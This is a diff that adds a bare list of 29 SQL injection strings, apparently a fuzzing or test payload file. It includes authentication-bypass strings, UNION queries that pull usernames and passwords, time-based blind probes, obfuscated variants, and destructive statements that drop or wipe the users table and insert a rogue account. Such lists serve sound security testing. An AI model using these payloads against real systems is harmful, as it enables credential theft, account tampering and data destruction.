@@ -1,0 +1,29 @@
+' OR '1'='1
+' OR 1=1--
+admin' --
+admin' #
+' OR '1'='1' --
+' OR '1'='1' /*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+1' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL,NULL,NULL--
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a
+' AND 'a'='b
+'; WAITFOR DELAY '00:00:05'--
+' OR SLEEP(5)--
+'; SELECT SLEEP(5)--
+admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'; DROP TABLE users--
+'; DELETE FROM users WHERE '1'='1
+'; INSERT INTO users VALUES('hacker','pass')--
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND extractvalue(1,concat(0x7e,version()))--
+0x53454c454354202a2046524f4d207573657273
+0x61646d696e
+admin'/**/--
+admin'/*comment*/--
+1' AND (SELECT COUNT(*) FROM users) > 0--
+' OR EXISTS(SELECT * FROM users WHERE username='admin')--
